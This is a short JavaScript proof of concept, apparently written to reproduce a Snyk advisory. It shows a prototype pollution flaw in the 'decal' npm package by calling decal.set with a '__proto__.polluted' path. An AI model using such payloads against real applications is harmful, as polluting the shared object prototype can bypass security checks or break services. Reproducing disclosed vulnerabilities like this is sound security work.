//https://security.snyk.io/vuln/SNYK-JS-DECAL-1051007
 
  const decal = require("decal");

   
  decal.set({}, "__proto__.polluted", "yes");
// End of file
